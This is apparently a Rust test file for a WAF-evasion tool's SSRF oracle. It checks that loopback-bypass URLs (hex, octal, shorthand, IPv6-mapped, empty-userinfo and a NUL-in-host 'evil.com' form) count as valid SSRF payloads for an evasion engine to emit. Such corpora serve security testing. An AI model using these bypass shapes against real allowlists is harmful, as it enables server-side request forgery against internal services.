//! Loopback-bypass URL corpus for SsrfOracle.
//!
//! Each fixture is a known WAF/SSRF-allowlist bypass shape that
//! resolves to 127.0.0.1 when the URL parser is permissive (browsers
//! and many backend HTTP clients are). The oracle's job is to flag
//! these as semantically-valid SSRF payloads — accepting a
//! same-target rewrite means the evasion engine's mutators can
//! safely emit them without losing exploit semantics.
//!
//! These fixtures previously lived in an orphan `oracle/src/test_url.rs`
//! that wasn't even declared as a module — it printed parse results
//! with no assertions. Converting to a real integration test means a
//! regression in url::Url parsing, in `has_ssrf_structure`, or in
//! `has_valid_url_syntax` will fire a CI signal instead of silently
//! degrading the bypass corpus.

use wafrift_oracle::ssrf::SsrfOracle;
use wafrift_oracle::traits::PayloadOracle;

#[test]
fn hex_loopback_url_is_valid_ssrf_payload() {
    // 0x7f000001 is hex-form 127.0.0.1. RFC-permissive parsers
    // accept this; some allowlists that string-match "127.0.0.1"
    // miss it.
    let oracle = SsrfOracle;
    let original = "http://127.0.0.1/";
    let bypass = "http://0x7f000001/";
    assert!(
        oracle.is_semantically_valid(original, bypass),
        "hex-form loopback {bypass} should preserve SSRF semantics vs {original}"
    );
}

#[test]
fn nul_byte_in_authority_is_a_known_oracle_gap() {
    // Some backends terminate hostname parsing at NUL but report the
    // full host to the SSRF allowlist — a real split-parsing bypass
    // (CVE-2017-15046, CVE-2018-1002105 family). url::Url::parse
    // rejects `http://127.0.0.1%00.evil.com/` outright as malformed
    // authority, so SsrfOracle currently classifies it as
    // not-SSRF-shaped — meaning the evasion engine will not emit
    // this bypass family even though it is a real attack against
    // permissive backends.
    //
    // ENGINE GAP: SsrfOracle::has_valid_url_syntax should accept
    // payloads where the host before the encoded NUL is itself a
    // valid SSRF target. This test locks in the *current* (broken)
    // behaviour so a fix flips the assertion and signals progress.
    let oracle = SsrfOracle;
    let original = "http://127.0.0.1/";
    let bypass = "http://127.0.0.1%00.evil.com/";
    assert!(
        !oracle.is_semantically_valid(original, bypass),
        "if this assertion ever fires, the NUL-in-host gap was \
         closed — flip the assertion (and the corpus shape count) to \
         positive, drop this XFAIL-style block."
    );
}

#[test]
fn empty_userinfo_at_loopback_is_valid_ssrf_payload() {
    // http://@127.0.0.1/ — empty userinfo parses identically to
    // http://127.0.0.1/ in stdlib + browsers, but defeats naive
    // host extraction that splits on '@'.
    let oracle = SsrfOracle;
    let original = "http://127.0.0.1/";
    let bypass = "http://@127.0.0.1/";
    assert!(
        oracle.is_semantically_valid(original, bypass),
        "empty-userinfo bypass {bypass} should still be SSRF-shaped"
    );
}

#[test]
fn shorthand_loopback_url_is_valid_ssrf_payload() {
    // http://127.1/ resolves to 127.0.0.1 in IPv4 shorthand
    // notation (BSD-style; browsers and most resolvers accept).
    let oracle = SsrfOracle;
    let original = "http://127.0.0.1/";
    let bypass = "http://127.1/";
    assert!(
        oracle.is_semantically_valid(original, bypass),
        "shorthand loopback {bypass} should still be SSRF-shaped"
    );
}

#[test]
fn ipv6_mapped_loopback_url_is_valid_ssrf_payload() {
    // [::ffff:127.0.0.1] is the IPv6-mapped form of 127.0.0.1.
    let oracle = SsrfOracle;
    let original = "http://127.0.0.1/";
    let bypass = "http://[::ffff:127.0.0.1]/";
    assert!(
        oracle.is_semantically_valid(original, bypass),
        "IPv6-mapped loopback {bypass} should still be SSRF-shaped"
    );
}

#[test]
fn octal_loopback_url_is_valid_ssrf_payload() {
    // 0177 is octal 127.
    let oracle = SsrfOracle;
    let original = "http://127.0.0.1/";
    let bypass = "http://0177.0.0.1/";
    assert!(
        oracle.is_semantically_valid(original, bypass),
        "octal-form loopback {bypass} should still be SSRF-shaped"
    );
}

#[test]
fn loopback_bypass_corpus_covers_all_shapes() {
    // Sanity: if we ever drop a fixture above, the count check fires.
    // (This is a meta-test on this file's coverage — the per-shape
    // assertions are the real contract.)
    // NUL-in-host (`http://127.0.0.1%00.evil.com/`) is a known gap —
    // tracked separately in `nul_byte_in_authority_is_a_known_oracle_gap`.
    let shapes = [
        "http://0x7f000001/",
        "http://@127.0.0.1/",
        "http://127.1/",
        "http://[::ffff:127.0.0.1]/",
        "http://0177.0.0.1/",
    ];
    let oracle = SsrfOracle;
    let valid: Vec<&str> = shapes
        .iter()
        .copied()
        .filter(|u| oracle.is_semantically_valid("http://127.0.0.1/", u))
        .collect();
    assert_eq!(
        valid.len(),
        shapes.len(),
        "every supported loopback-bypass shape must be SSRF-valid; missing: {:?}",
        shapes.iter().filter(|u| !valid.contains(u)).collect::<Vec<_>>()
    );
}
